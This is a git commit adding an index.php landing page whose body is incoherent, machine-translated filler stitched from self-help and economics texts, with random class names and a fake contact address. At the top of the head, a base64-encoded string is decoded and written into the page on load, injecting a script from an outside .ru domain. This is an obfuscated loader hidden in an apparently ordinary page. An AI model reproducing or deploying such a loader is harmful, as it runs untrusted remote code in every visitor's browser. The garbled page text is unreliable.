b6c761dd15146f434a96bb64493666808e8e648d
hobrhwkn <80979479+hobrhwkn@users.noreply.github.com>
2021-03-19 19:58:24 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9jMjJmeTgxZDVvOW9lMmlnOTIiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>“I decide to go to the competition,” the student said confusedly.  </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="uqlcjli1v54erj2wsz8rqe8">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="c9423i7zs8y1upkua0ek03">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>“I decide to go to the competition,” the student said confusedly.  </h1>
+	</section>
+
+
+	<section class="our-work" class="xc3pf0vr7ojjmlgrhug">
+		<h3 class="title">We did not have such a question with him.  The capi</h3>
+		<p>The Ethics of Personality tells me that there should be some new book or some special seminar where, having discovered her feelings with the rest of the participants, my wife would learn to understand me better.  - Well, sonny, on the hands? - Deal! - What should be the courtyard? - Green and clean! - What does “green” mean? The son looked around our courtyard, which already looked better.  The monopolist has two options: 1) using the deficit to keep the price high;2) increased sales at discounted prices.  Maintain a positive attitude.  However, each of them acquires more general utility for itself in comparison with the other side.  The product is the basis of the entire marketing mix.  Arthur Gordon, in his short story "The Turn in Life", sets out a delightful,a deeply personal story of his own spiritual renewal.  If I am addicted intellectually, I expect that you will think for me, that you will think over all the nuances and problems of my life.  When the principles are clear, practice and specific application may differ from person to person.  As you study the weekly schedule on the following pages, notice how each of the nineteen most important goals, many of which are in Quadrant II, have been built into the schedule or translated into a specific action plan.  At the same time, it is not taken into account that the transition to a new system of accounting and taxation in itself is a laborious and costly process.  One plus one equals three or more. </p>
+		<hr>
+
+		<ul class="grid" class="ei9gydpc0dtpiiv">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="xc3pf0vr7ojjmlgrhug">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>Joe, for example, dropped out of school.Now he fixes cars.  After a series of meetings, we were already able to jointly tackle key issu</td>
+    <td>We usually strive to be understood first.  The statement that people have preferences confirms the fact thatthat they actuall</td>
+    <td>producing a limited number of goods, and diversified - producing different goods.  They worry about what others might think of them.  70.  In </td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>Differentiator of commodity producers.  As the various alternatives were discussed, it emerged that Win / Win appears to be the only truly realistic ap</td>
+    <td>Take some time to write down the imaginary funeral experiences we talked about at the very beginning of this chapter.  In a sense, this is a paradox</td>
+    <td>It can only be developed indirectly, through exercises for muscle groups, especially the legs.  If the goal of marketing research is </td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>So during a short break, I went out into the hall, where I bumped into a messenger hurrying to another conference room.  </td>
+    <td>According to the degree of generalization of reporting data, they are distinguished: primary reports,compiled directly by organizati</td>
+    <td>True independence of character motivates us to act, not be influenced.  They are carried out in the form of cash, bank deposits, shares, shares and other securitie</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="uqlcjli1v54erj2wsz8rqe8">
+		<h3 class="title">And these shifts give rise to serious chan</h3>
+		<p>The number of buyers.  Updating any dimension enhances your ability to live according to at least one of the seven skills.While these skills are sequential, improving in one of them synergistically enhances your ability to master others.  But so far many enterprises cannot use this right: higher depreciation rates would increase costs.  with less resource consumption.  The great reformer Martin Luther is credited with the words: "I have so much to do today that it will take an extra hour to kneel." For him, prayer was not a mechanical procedure, but was a source of strength to release and increase his energy.  Taxes and subsidies.Businesses view most taxes as production costs.  Another example of the actual use of the theory of elasticity is government tax policy, as well as employment policy.  Imagine that a person in charge of using a physical resource, such as a machine tool, seeks to make a favorable impression on his superiors. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="c9423i7zs8y1upkua0ek03" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="xc3pf0vr7ojjmlgrhug">
+		<h3 class="title">- I expect that you yourself will come to me with appropriate p</h3>
+		<p>They went to the heads of various departments, such as the accounting department, and said something like this: - Sir, I am participating in a new experimental program called student-led learning.  They are not guided by the paradigm of interdependence, which is necessary for success in marriage, in the family, or within any organization.  - Yes! The doctor said abruptly.  A few years ago, when I was giving a seminar on the ocean coast in Oregon, one of the students came up to me and said, “You know, Stephen, I have absolutely no pleasure in participating in these seminars! He managed to completely capture my attention! “There are such interesting people here,” he continued, “amazing nature and the sea, and everything is so wonderful! And I just sit and painfully wait for the evening when my wife will call and torment me on the phone. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="ei9gydpc0dtpiiv" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="ei9gydpc0dtpiiv" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="uqlcjli1v54erj2wsz8rqe8">
+		<h3 class="title">They are counter-dependent - this is another form o</h3>
+		<p>Everyone else is focused on details, particulars, and I see the whole picture as a whole.  You may find that you are prioritizing and doing things that you shouldn't be doing at all.  As Emerson once said [4]: ​​“You scream so loudly in my ears that I cannot hear,what do you say".  It is a principles-based, character-based approach to personal and interpersonal effectiveness.  Such a person is devoid of power.  These are those who are forced to work part-time or part-time.  If you want to improve your business or your personal life, if you want to increase your own value, READ THIS BOOK! Mikhail Krasnov, Managing Director of Merisel Company Recently, I presented my eldest son with Stephen Covey's book “Seven Habits of Highly Effective People”.  It is within your Circle of Influence.  And if, for example, the price of his products falls, then, most likely,a huge number of buyers will use his product.  Your trust in me grows, and if necessary, I can use this trust many times.  The Lose / Win position is initially weak and chaotic. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="c9423i7zs8y1upkua0ek03" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="xc3pf0vr7ojjmlgrhug">
+		<h3 class="title">People sconchurch-centered often tend to l</h3>
+		<p>All four of these factors - security, focus, wisdom, and power - are interdependent.  As you improve in one dimension, you simultaneously increase your capabilities in others.  This model represents another reactive selfish lifestyle focused on the Circle of Concern,and is a consequence of the development of emotional myopia in a person.  These are not greens.  possesses value.  When you start,by presenting the ultimate goal, you take on a completely different perspective.  - Well, I just have this feeling! - her right brain was dealing with images and intuitive feelings.  The gravity of some of our habits can prevent us from going where we want to go.  Marshall and is a percentage change in one variable in response to a percentage change in another variable. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="ei9gydpc0dtpiiv" class="title">In this sense, the youngest son gave us nothing.Our idea of ​​o</h3>	
+		<p>But if our Emotional Bank Account is significant, then the issue of trust is no longer a problem.  The existence of exchange offices, investment companies, dealers and other intermediaries is excluded; 4) such an instrument of competition as price knocking is excluded; 5) the absence of preferences of a spatial, personal and temporal nature is assumed.Perfectly competitive markets have the highest degree of independence in the behavior of buyers and sellers.  As the children grew older, their musical tastes began to change, and they wanted to be more involved in defining their performance repertoire and choosing costumes.  The problem of renewing Russian capital is very acute.  We ourselves - our being, our essence, our nature - are much deeper than our consciousness. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="uqlcjli1v54erj2wsz8rqe8">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="c9423i7zs8y1upkua0ek03"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="xc3pf0vr7ojjmlgrhug"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="ei9gydpc0dtpiiv"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>0456 Tiana Terrace, Apt. 406, 21926, Lake Jannie, Montana, United States</p>
+		<p>Phone number: +74(0192)179-81385</p>
+	</footer>
+
+</body>
+
+</html>
